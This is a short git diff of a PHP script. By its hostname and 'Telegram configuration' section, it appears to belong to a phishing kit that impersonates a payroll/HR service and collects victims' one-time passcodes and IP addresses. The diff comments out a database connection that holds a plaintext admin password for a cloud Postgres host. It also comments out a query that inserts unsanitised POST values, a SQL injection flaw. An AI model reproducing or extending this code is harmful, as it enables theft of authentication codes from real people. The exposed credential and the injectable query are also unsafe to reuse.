@@ -1,5 +1,5 @@
 <?php
-    $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
+    // $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
 
 
 // Telegram configuration
@@ -26,8 +26,8 @@
     $userotp=$_POST['userotp'];
 
 if ($_SERVER["REQUEST_METHOD"]=="POST"){
-    $query = "INSERT INTO otp (userotp,time,ip) VALUES ('$_POST[userotp]',NOW(),'$_POST[ip]')";
-    $result = pg_query($query);
+    // $query = "INSERT INTO otp (userotp,time,ip) VALUES ('$_POST[userotp]',NOW(),'$_POST[ip]')";
+    // $result = pg_query($query);
 
 
 // Get and define form inputs
